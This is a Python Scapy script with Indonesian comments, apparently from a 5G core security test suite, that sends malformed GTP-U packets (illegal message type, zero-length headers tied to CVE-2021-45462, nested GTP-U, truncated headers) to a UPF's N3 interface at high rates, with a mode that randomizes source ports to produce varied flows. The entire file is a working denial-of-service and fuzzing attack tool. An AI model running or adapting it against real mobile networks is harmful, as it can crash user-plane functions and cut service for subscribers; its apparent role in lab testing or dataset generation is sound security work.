#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Tier 1 (T1-01) — GTP-U malformed ke UPF N3 (CVE-2021-45462; Trend Micro 2023).
Kirim paket GTP-U cacat: message-type ilegal (0xFF), zero-length, dan
GTP-U-in-GTP-U (nested) → menguji ketahanan parser GTP-U UPF.

  python3 gtpu_malformed.py <upf_n3_ip> [durasi_detik] [pps]
Contoh: python3 gtpu_malformed.py 172.23.0.30 15 2000

Mode EPISODE (revisi R2) via env var: tiap session = UDP source port efemeral
baru → 1 flow independen. Variasi malformasi (gtp_type/panjang payload) di-jitter
antar-session agar episode beragam.
  SESSIONS=<n>   jumlah flow independen (source port acak) dlm 1 run
  PKTS_PER_SESSION=<k>  paket cacat per flow (default 8)
  SPORT_LO/SPORT_HI     rentang port efemeral (default 20000..60000)
Default (SESSIONS kosong) = perilaku lama (sport=2152) agar tier1 reproducible.
"""
import sys, time, os, random, struct

os.environ.setdefault("SCAPY_USE_PCAPDNET", "0")
from scapy.all import IP, UDP, Raw, send
from scapy.contrib.gtp import GTP_U_Header

GTPU_PORT = 2152

def build_malformed(target, sport=GTPU_PORT, plen=None):
    teid = random.randint(1, 0xFFFFFFFF)
    n = plen if plen is not None else 32
    variants = []
    # 1) message-type ilegal 0xFF + payload (parser harus menolak)
    variants.append(IP(dst=target)/UDP(sport=sport, dport=GTPU_PORT)/
                    GTP_U_Header(gtp_type=0xFF, teid=teid)/Raw(load=os.urandom(n)))
    # 2) zero-length tapi ada payload (length field tak konsisten) — vektor CVE-2021-45462
    variants.append(IP(dst=target)/UDP(sport=sport, dport=GTPU_PORT)/
                    GTP_U_Header(gtp_type=255, length=0, teid=teid)/Raw(load=os.urandom(max(4, n//2))))
    # 3) GTP-U-in-GTP-U (nested) — "GTP-U in GTP-U" Trend Micro
    inner = GTP_U_Header(gtp_type=255, teid=teid)/Raw(load=os.urandom(8))
    variants.append(IP(dst=target)/UDP(sport=sport, dport=GTPU_PORT)/
                    GTP_U_Header(gtp_type=255, teid=teid)/bytes(inner))
    # 4) header terpotong (truncated) — raw di atas UDP 2152
    variants.append(IP(dst=target)/UDP(sport=sport, dport=GTPU_PORT)/
                    Raw(load=b"\x3f\xff" + os.urandom(3)))
    return variants

def run_episode_mode(target, sessions):
    pks = int(os.environ.get("PKTS_PER_SESSION", "8"))
    lo = int(os.environ.get("SPORT_LO", "20000")); hi = int(os.environ.get("SPORT_HI", "60000"))
    print(f"[T1-01] GTP-U malformed EPISODE: {sessions} flow × {pks} pkt (sport {lo}-{hi}) → {target}:{GTPU_PORT}")
    sent = 0; ports = set()
    for _ in range(sessions):
        sport = random.randint(lo, hi)
        while sport in ports: sport = random.randint(lo, hi)
        ports.add(sport)
        plen = random.choice([8, 16, 32, 64, 128])   # variasi panjang payload antar-episode
        i = 0
        while i < pks:
            for p in build_malformed(target, sport, plen):
                send(p, verbose=0); sent += 1; i += 1
                if i >= pks: break
        time.sleep(random.uniform(0.01, 0.04))
    print(f"[T1-01] EPISODE selesai: {len(ports)} flow unik, {sent} paket GTP-U cacat.")

def main():
    if len(sys.argv) < 2:
        print(__doc__); sys.exit(2)
    target = sys.argv[1]
    sessions = int(os.environ.get("SESSIONS", "0"))
    if sessions > 0:
        run_episode_mode(target, sessions); return
    # --- perilaku lama ---
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 15
    pps = int(sys.argv[3]) if len(sys.argv) > 3 else 2000
    interval = 1.0 / pps if pps > 0 else 0
    print(f"[T1-01] GTP-U malformed → {target}:{GTPU_PORT}, {duration}s @ ~{pps}pps")
    end = time.time() + duration
    sent = 0
    while time.time() < end:
        for p in build_malformed(target):
            send(p, verbose=0)
            sent += 1
            if interval: time.sleep(interval)
    print(f"[T1-01] selesai, {sent} paket GTP-U cacat terkirim.")

if __name__ == "__main__":
    main()
